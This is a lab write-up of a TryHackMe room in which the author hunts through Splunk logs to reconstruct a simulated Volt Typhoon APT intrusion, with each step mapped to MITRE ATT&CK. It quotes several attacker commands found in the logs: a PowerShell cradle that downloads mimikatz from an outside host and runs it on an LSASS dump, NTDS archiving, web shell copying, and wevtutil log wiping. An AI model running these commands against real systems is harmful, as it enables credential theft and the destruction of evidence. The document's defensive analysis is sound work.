---
title: 'Volt Typhoon'
target: 'TryHackMe — Volt Typhoon'
difficulty: 'medium'
date: 2026-08-27
summary: 'Splunk-based threat hunting through a Volt Typhoon APT intrusion — tracing the kill chain from initial access via ADSelfService Plus account takeover through WMIC reconnaissance, web shell persistence, credential theft with mimikatz, lateral movement, data exfiltration, and log cleanup.'
role: 'soc'
tags: ['Splunk', 'Volt Typhoon', 'APT', 'Threat hunting', 'ADSelfService Plus', 'WMIC', 'PowerShell', 'mimikatz', 'MITRE ATT&CK']
problem: 'The SOC has flagged suspicious activity matching the Volt Typhoon APT group. A Splunk instance holds logs from ADSelfService Plus, WMIC, and PowerShell — the task is to reconstruct the full kill chain across MITRE ATT&CK tactics, from initial access to cleanup.'
action: 'Queried Splunk across three log sources to trace each phase: identified the compromised account and password-change takeover in ADSelfService logs, found WMIC reconnaissance and ntdsutil execution, decoded a base64 web shell and mimikatz download command, tracked lateral movement via web shell copying, mapped data collection of financial backups, identified C2 proxy setup via netsh, and confirmed log wiping as the final cleanup step.'
outcome: 'Complete kill chain reconstruction across eight MITRE ATT&CK tactics, with every IOC — accounts, commands, timestamps, file paths, encoded payloads — extracted from Splunk and correlated into a single intrusion narrative.'
draft: false
---

Volt Typhoon is a SOC-focused room that puts you behind a Splunk console with
three log sources — ADSelfService Plus, WMIC, and PowerShell — and asks you to
reconstruct a full APT intrusion mapped to MITRE ATT&CK tactics. There's no
exploitation here; the attack already happened, and the job is to read the logs
well enough to tell the story of what the adversary did, in what order, and
why each step mattered.

The scenario: Volt Typhoon, a real-world Chinese state-sponsored APT group
known for living-off-the-land techniques, has compromised the environment.
Every answer lives in the Splunk queries.

## Initial Access — account takeover via ADSelfService Plus

The first log source is ADSelfService Plus, a self-service password management
portal. The logs live under `sourcetype=adss` at
`/home/volthunter/logfiles/adss.log`. Searching for all events reveals
activity under the `dean-admin` account from `server-02`:

```
index=main sourcetype=adss
```

![dean-admin Profile Update event in Splunk](/writeups/thm-volt-typhoon/01-dean-admin-profile-update.png)

The earliest event is a **Profile Update** for `dean-admin` at
`2024-03-30T18:45:52` from IP `192.168.1.116` — the attacker modifying the
account's security questions or recovery settings to prepare for a password
change. This is the initial access vector: taking over a self-service portal
to reset a privileged account's password without needing the original
credentials.

The password change events tell the rest of the story — a failed attempt from
`192.168.1.173` on March 29, then a successful one from `192.168.1.134` on
March 24:

![Password Change events showing failed and completed attempts with timestamps](/writeups/thm-volt-typhoon/02-password-change-events.png)

The successful password change at `2024-03-24T11:10:22` is the earliest
`dean-admin` event — that's when the attacker first gained control of the
credentials. The failed attempt five days later from a different IP suggests
either a retry from a different host or a check that the credentials still
work.

Looking at the breakdown of `action_name` field values across all events in the
index:

![action_name field values breakdown](/writeups/thm-volt-typhoon/03-action-name-breakdown.png)

Nine distinct action types across 2,046 events. Most are routine — Account
Unlock (395), Password Reset (65), Profile Update (64) — but one stands out:
**Enrollment** with just 4 events. Enrollment corresponds to new account
registration:

![Enrollment event showing voltyp-admin account creation](/writeups/thm-volt-typhoon/04-enrollment-voltyp-admin.png)

Filtering for Enrollment events reveals the attacker enrolled
**voltyp-admin** at `2024-03-24T11:12:26` — just two minutes after the
successful password change on `dean-admin`. A persistence account created
immediately after gaining access. The naming is a nod to the threat group
itself.

## Execution — WMIC reconnaissance

Switching to the WMIC logs at
`/home/volthunter/logfiles/wmicupdated0221.log`, the attacker used Windows
Management Instrumentation to enumerate the environment. The command is
visible in the event detail:

```
index=main sourcetype=wmic
```

![WMIC logicaldisk query targeting server01 and server02](/writeups/thm-volt-typhoon/05-wmic-logicaldisk.png)

The command `wmic /node:server01, server02 logicaldisk get caption, filesystem,
freespace, size, volumename` runs under `dean-admin` from `server-02-main` at
`2024-03-25T21:30:03`. It targets both **server01** and **server02** in a
single call, enumerating their disk layout — capacity, free space, filesystem
type. This is standard reconnaissance: the attacker is mapping what storage
exists on the network before deciding what to exfiltrate.

The WMIC logs also reveal execution of **ntdsutil**, a legitimate Windows
utility that can extract the Active Directory database (NTDS.dit) — a critical
credential-theft tool when used by an attacker.

## Persistence — base64-encoded web shell

The PowerShell logs (`/home/volthunter/logfiles/pshell.log`) contain encoded
commands. Searching for indicators of encoding:

```
index=main sourcetype="powershell" (echo OR -EncodedCommand OR Write-Output OR -E)
```

![PowerShell search results for echo, EncodedCommand, and Write-Output](/writeups/thm-volt-typhoon/06-powershell-encoded-search.png)

Three events come back. One of the encoded payloads, when decoded through
CyberChef's From Base64 operation, reveals a **web shell** — a persistent
backdoor that gives the attacker command execution through a web interface.
The web shell provides ongoing access independent of the stolen credentials,
surviving password resets or account lockouts.

## Defense Evasion — cleanup and firewall manipulation

The attacker covered their tracks using PowerShell's `Remove-*` cmdlets.
Filtering for removal commands:

```
index=main sourcetype="powershell" CommandLine=*Remove*
```

![Remove cmdlet CommandLine values showing Remove-Item, Remove-ItemProperty, and Remove-NetFirewallRule](/writeups/thm-volt-typhoon/07-remove-cmdlets.png)

Eleven events across three distinct `CommandLine` values: **Remove-Item** (7
events, 63.6%), **Remove-ItemProperty** (3 events, 27.3%), and
**Remove-NetFirewallRule** (1 event, 9.1%). `Remove-Item` deletes files,
`Remove-ItemProperty` clears registry values to hide configuration changes,
and `Remove-NetFirewallRule` removes firewall rules — either cleaning up rules
the attacker added, or weakening defenses for lateral movement.

The WMIC logs also show file renaming and archiving activity. Searching for
the archive:

```
index=main sourcetype="wmic" "cisco-up.7z"
```

![WMIC events showing cisco-up.7z file rename and archive operations](/writeups/thm-volt-typhoon/08-wmic-cisco-archive.png)

Two events: first, at `2024-03-25T23:47:07`, a 7z archive is created —
`cmd.exe /c 7z a -v100m -p d5ag0nm05t3r -t7z cisco-up.7z
C:\inetpub\wwwroot\temp.dit` — compressing `temp.dit` (likely the extracted
NTDS.dit) into password-protected split volumes. Then at `2024-03-26T02:02:35`,
a rename: `cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z
cl64.gif` — disguising the archive as a GIF image. The `cisco-up` naming
convention is deliberate: it looks like a legitimate Cisco firmware update
file, and renaming it to `.gif` adds another layer of evasion.

## Credential Access — mimikatz via encoded PowerShell

The most significant encoded command, decoded through CyberChef's From Base64
operation, reveals a download cradle for **mimikatz**:

![CyberChef Base64 decode revealing mimikatz download command](/writeups/thm-volt-typhoon/09-cyberchef-mimikatz-decode.png)

The decoded command is:

```powershell
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile
"C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe"
-ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
```

It downloads mimikatz from the attacker's infrastructure (`voltyp.com`),
saves it to `C:\Temp\db2\`, and immediately runs it against an LSASS dump
to extract credentials. Combined with the ntdsutil execution and the
password-protected 7z archive of `temp.dit` from the WMIC logs, this
represents a two-pronged credential theft approach: mimikatz for in-memory
credentials (LSASS), ntdsutil for the full Active Directory database.

## Discovery and Lateral Movement — web shell propagation

With credentials in hand, the attacker moved laterally. Searching for
activity targeting other servers:

```
index=main sourcetype="powershell" *server-02*
```

![PowerShell Copy-Item moving iisstart.aspx to AuditReport.jspx on server-02](/writeups/thm-volt-typhoon/10-copy-item-webshell-lateral.png)

One event at `2024-03-29T19:47:43` — a `Copy-Item` command:

```powershell
Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination
"\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"
```

The command copies `iisstart.aspx` — the web shell disguised as the default
IIS start page — from the local temp directory to **server-02** as
`AuditReport.jspx`. Two evasion techniques in one move: the source filename
mimics a legitimate IIS file, and the destination filename sounds like a
routine audit report. The `.jspx` extension suggests the target runs a
Java-capable web server alongside IIS.

## Collection — financial data exfiltration

The attacker targeted financial records. The PowerShell logs show three
`Copy-Item` commands in rapid succession on `2024-03-27`:

![FinanceBackup CSV copy events for 2022.csv, 2023.csv, and 2024.csv](/writeups/thm-volt-typhoon/11-finance-backup-copy.png)

Three files staged from `C:\ProgramData\FinanceBackup\` to
`C:\Windows\Temp\faudit\`:

- `2024.csv` at 23:52:49 (SequenceNumber=19)
- `2023.csv` at 23:52:15 (SequenceNumber=79)
- `2022.csv` at 23:51:55 (SequenceNumber=45)

Three years of financial data, copied to a staging directory before
exfiltration. The destination path `faudit` (financial audit) is innocuous
enough to avoid suspicion. This is the objective the entire kill chain was
building toward — the reconnaissance, credential theft, and lateral movement
all served to reach these files.

## Command and Control — netsh proxy

The C2 channel was established through a built-in Windows utility. Searching
for netsh activity:

```
index=main sourcetype="powershell" CommandLine=*netsh*
```

![netsh search query showing 2 events](/writeups/thm-volt-typhoon/12-netsh-proxy.png)

Two events. The **netsh** commands configure a network proxy — a
living-off-the-land C2 channel that uses a legitimate Windows binary to
tunnel traffic, avoiding the need for custom malware that might be detected
by endpoint protection.

## Cleanup — event log wiping

The final phase is covering tracks. The attacker used `wevtutil cl` to clear
Windows event logs at `2024-03-29T22:04:23`:

![wevtutil cl wiping Application, Security, Setup, and System logs](/writeups/thm-volt-typhoon/13-wevtutil-log-clear.png)

The command in full:

```
wevtutil cl Application Security Setup System
```

Four log channels wiped in a single command — **Application**, **Security**,
**Setup**, and **System** — essentially every major Windows event log. This is
the last act: once the data is exfiltrated and the persistent access is in
place, wipe the logs to make forensic reconstruction harder. The irony is that
the Splunk forwarder already ingested these events before they were cleared
locally, which is exactly why centralised log collection exists.

## What I took from this

The thing this room drives home is why MITRE ATT&CK matters as an
investigation framework, not just a taxonomy. Each Splunk query maps to a
tactic, and the tactics map to a story: the attacker took over a self-service
portal, created a persistence account, ran reconnaissance with built-in
tools, stole credentials two different ways, moved laterally by copying a
disguised web shell, staged financial data for exfiltration, set up a proxy
for C2, and wiped the logs on the way out. Every step used a legitimate
Windows tool — WMIC, PowerShell, netsh, wevtutil, reg — which is exactly
what makes Volt Typhoon hard to detect: nothing they did would trigger a
signature-based alert.

The other lesson is about log architecture. The attacker's final move was
wiping local event logs, and if those logs hadn't already been forwarded to
Splunk, the investigation would have had nothing to work with. Centralised
log collection isn't just convenient — it's the difference between
reconstructing a kill chain and having a blank page.
